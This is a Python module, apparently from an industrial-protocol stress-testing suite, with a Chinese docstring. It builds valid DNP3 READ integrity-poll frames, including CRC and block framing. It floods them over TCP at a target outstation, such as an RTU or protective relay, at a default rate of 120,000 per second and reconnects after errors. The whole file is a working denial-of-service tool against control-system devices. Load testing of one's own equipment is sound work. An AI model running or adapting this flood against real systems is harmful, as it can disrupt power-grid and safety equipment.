"""
測項：DNP3 Application Layer Read (Class 0) 高頻率洪水
分類：DNP3
說明：與同分類既有的 syn_flood.py（傳輸層 SYN 半開）、conn_pool_exhaustion.py（純 TCP
     連線池）、link_status_flood.py（資料連結層心跳訊框）互補：以上三者都停留在
     TCP/連結層，尚未真正測到 Outstation（RTU/保護electric繼電器等現場裝置）的
     「應用層請求處理」吞吐能力。真實 DNP3 主站（Master）最常見的操作就是週期性
     送出 Class 0（或 Class 0/1/2/3）Integrity Poll（Function Code 1 = READ），本測項
     在已建立的 TCP 連線上，以受控速率重複送出這種合法、完整組成的 READ 請求，
     測試 Outstation 應用層解析/回應大量請求時的資源與效能表現，比傳輸層測試更貼近
     實際攻擊/負載情境。

DNP3 訊框分層（由外而內）：
    Data Link Layer : START(2)=0x0564 + LEN(1) + CTRL(1) + DEST(2,LE) + SRC(2,LE) + CRC(2)
                       接著是 User Data，依規範每 16 bytes 一組區塊（block），
                       每個區塊各自附加獨立的 CRC16（即題目所述的「16-byte block
                       interleaving」）。
    Transport Layer  : User Data 的第 1 個 byte，FIN(1) FIR(1) SEQUENCE(6)。
    Application Layer: Application Control(1) + Function Code(1) + Object Header(...)。
        - Application Control：FIR=1 FIN=1 CON=0（不要求應用層確認，維持單向請求以
          降低複雜度、避免需要處理/重送確認流程）UNS=0 + 4-bit 序號（0~15 遞增）。
        - Function Code = 0x01（READ）。
        - Object Header：Group=60（Class Objects）、Variation=class_variation 參數
          （1=Class0, 2=Class1, 3=Class2, 4=Class3，對應標準的「Class N Poll」）、
          Qualifier=0x06（no range，代表『全部物件、不含 index/range 欄位』）—— 這正是
          每一套 DNP3 主站軟體做「Integrity Poll」時使用的標準 Object Header 組合。

CRC-16/DNP：
  - 本檔案的 _crc16_dnp3() 函式**直接沿用** link_status_flood.py 已經在用的同一份
    位元運算實作（多項式常數 0xA6BC），未重新發明或修改任何一行——理由：
      1) 重用已在專案內使用中的 CRC/framing helper，降低重工出錯風險；
      2) 0xA6BC 是標準 DNP3 CRC-16（多項式 0x3D65，記為 x^16+x^13+x^12+x^11+x^10+
         x^8+x^6+x^5+x^2+1）在「LSB-first / 右移式」實作下的 bit-reversed 表示法，
         把 0x3D65 的 16 個位元前後反轉即可得到 0xA6BC，兩者是同一個多項式的兩種
         等價寫法（一般教科書/RFC 常見的『反射多項式』寫法），這與 opendnp3、
         pydnp3 等公開實作內部使用的 CRC 表格生成方式一致。
  - 新增的部分是「16-byte 區塊切割 + 逐區塊附加 CRC」邏輯（_split_into_crc_blocks），
    這是本檔案新寫的，依 DNP3 規範文字實作、**未在真實 Outstation 或封包截取上
    驗證過**。不過本測項預設的 Read 請求 User Data（Transport 1 byte + Application
    5 bytes 共 6 bytes）遠小於 16 bytes，實際上只會落在單一區塊、只會用到一組 CRC，
    多區塊切割邏輯目前不會被觸發到，只是為了正確性與未來擴充（例如夾帶更大 Object
    Header）而完整實作。LEN 欄位計算方式（=5 + 切割前的 User Data 原始長度，不含
    區塊間新增的 CRC bytes）已依規範核對。
  - Data Link CTRL byte 使用 0xC4（DIR=1, PRM=1, FCB=0, FCV=0, FUNC=4=
    UNCONFIRMED_USER_DATA），這是各家 DNP3 主站送出一般請求時常見的標準寫法。
  - 正式使用前仍建議用 Wireshark（內建 DNP3 解析器）驗證產生的訊框，尤其是 CRC 是否
    被目標正確接受；如有落差請以 Wireshark 結果為準調整。
需求：無額外套件，純標準函式庫（未使用 pydnp3 —— 該套件已多年未積極維護、且其
API 設計以「建立完整 Master/Outstation stack」為目標，直接借用其 session/channel
物件來做「單純、高速、可控速率送出裸 Read 請求」這種用途反而更重、更難精準控制
節奏與 stop_event 中斷時機，因此選擇沿用本專案既有的手刻 frame 風格）。
"""
import socket
import time

from ..common import RateLimiter, clamp_duration

NAME = "DNP3 應用層 Read (Class 0) 請求洪水"
CATEGORY = "DNP3"
PROTOCOL = "TCP"
DEFAULT_PORT = 20000
TEST_TYPE = "traffic"  # 流量型：應用層 READ 請求洪水，靠請求速率本身造成負擔

_START = b"\x05\x64"  # DNP3 Data Link Layer 固定起始位元組
_DL_BLOCK_SIZE = 16    # DNP3 規範：User Data 每 16 bytes 為一個 CRC 區塊
_MAX_RECONNECT_STREAK = 5  # 連續重連失敗達此次數就放棄，避免對已經掛掉的目標無限重試


def _crc16_dnp3(data: bytes) -> bytes:
    """DNP3 CRC-16，多項式 0xA6BC（bit-reversed 表示法，對應標準多項式 0x3D65）。
    與 link_status_flood.py 內的同名函式完全相同（直接複用同一套已使用中的實作，
    見本檔案頂部 docstring 的說明），逐位元運算版本。"""
    crc = 0x0000
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xA6BC
            else:
                crc >>= 1
    crc = (~crc) & 0xFFFF
    return bytes([crc & 0xFF, (crc >> 8) & 0xFF])


def _split_into_crc_blocks(user_data: bytes) -> bytes:
    """依 DNP3 規範把 Data Link User Data 切成每組最多 16 bytes 的區塊，
    每個區塊各自附加獨立的 CRC16（block interleaving）。"""
    out = bytearray()
    for i in range(0, len(user_data), _DL_BLOCK_SIZE):
        block = user_data[i:i + _DL_BLOCK_SIZE]
        out += block
        out += _crc16_dnp3(block)
    return bytes(out)


def _build_read_class_frame(dest_addr: int, src_addr: int, app_seq: int,
                             transport_seq: int, class_variation: int) -> bytes:
    """組一個完整的 DNP3 應用層 Read 請求訊框（Function Code 1 = READ，
    Object 60/class_variation，Qualifier 0x06 = 全部物件不含 range）。"""
    app_control = 0xC0 | (app_seq & 0x0F)          # FIR=1 FIN=1 CON=0 UNS=0 + 4-bit seq
    function_code = 0x01                            # READ
    obj_header = bytes([0x3C, class_variation & 0xFF, 0x06])  # Group60 / VarN / Qualifier 0x06
    application_fragment = bytes([app_control, function_code]) + obj_header

    transport_byte = bytes([0xC0 | (transport_seq & 0x3F)])  # FIR=1 FIN=1 + 6-bit seq
    user_data = transport_byte + application_fragment

    ctrl = 0xC4  # DIR=1 PRM=1 FCB=0 FCV=0 FUNC=4 (UNCONFIRMED_USER_DATA)
    length = 5 + len(user_data)  # CTRL+DEST+SRC(5) + User Data 原始長度（不含區塊 CRC）
    header_body = bytes([length, ctrl]) + dest_addr.to_bytes(2, "little") + src_addr.to_bytes(2, "little")
    header_crc = _crc16_dnp3(header_body)

    return _START + header_body + header_crc + _split_into_crc_blocks(user_data)


def get_param_schema() -> dict:
    return {
        "rate_per_sec": {"type": "int", "default": 120000, "min": 1, "max": 120000, "desc": "每秒送出應用層 Read 請求數"},
        "dest_addr": {"type": "int", "default": 1, "min": 0, "max": 65535, "desc": "DNP3 目的位址（Outstation）"},
        "src_addr": {"type": "int", "default": 1, "min": 0, "max": 65535, "desc": "DNP3 來源位址（Master）"},
        "class_variation": {
            "type": "int", "default": 1, "min": 1, "max": 4,
            "desc": "Object 60 的 Variation：1=Class0, 2=Class1, 3=Class2, 4=Class3（標準 Integrity Poll 物件）",
        },
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_per_sec", 300))
    dest_addr = int(params.get("dest_addr", 1))
    src_addr = int(params.get("src_addr", 1))
    class_variation = int(params.get("class_variation", 1))
    if class_variation < 1 or class_variation > 4:
        class_variation = 1

    limiter = RateLimiter(rate)
    sent, errors, reconnects = 0, 0, 0
    app_seq, transport_seq = 0, 0
    start = time.time()

    def _connect():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0)
        s.connect((target, port))
        s.setblocking(False)  # 之後只做非阻塞的 recv 清理緩衝，不讓等待回應拖慢送出節奏
        return s

    try:
        sock = _connect()
    except OSError as e:
        log_fn(f"[!] 無法連線 {target}:{port}: {e}")
        return {"requests_sent": 0, "error": str(e)}

    log_fn(f"[+] 開始送出 DNP3 應用層 Read (Class0 poll variation={class_variation}) 請求 @ {rate}/s")
    reconnect_streak = 0
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        app_seq = (app_seq + 1) & 0x0F
        transport_seq = (transport_seq + 1) & 0x3F
        frame = _build_read_class_frame(dest_addr, src_addr, app_seq, transport_seq, class_variation)
        try:
            sock.sendall(frame)
            sent += 1
            reconnect_streak = 0
        except OSError as e:
            errors += 1
            if errors <= 5:
                log_fn(f"[!] send error: {e}，嘗試重新建立連線")
            try:
                sock.close()
            except OSError:
                pass
            reconnect_streak += 1
            if reconnect_streak > _MAX_RECONNECT_STREAK:
                log_fn("[!] 連續重連失敗次數過多，提前結束測試")
                break
            try:
                sock = _connect()
                reconnects += 1
            except OSError as e2:
                log_fn(f"[!] 重新連線失敗: {e2}")
                break
            continue
        # 非阻塞清空接收緩衝，避免本端 TCP 接收緩衝被大量 Read 回應塞滿造成反壓；
        # 不解析回應內容，僅是清理，不影響本測項「送出請求數」這個核心攻擊壓力指標。
        try:
            while sock.recv(4096):
                pass
        except (BlockingIOError, OSError):
            pass

    try:
        sock.close()
    except OSError:
        pass

    return {
        "requests_sent": sent,
        "errors": errors,
        "reconnects": reconnects,
        "elapsed_sec": round(time.time() - start, 1),
    }
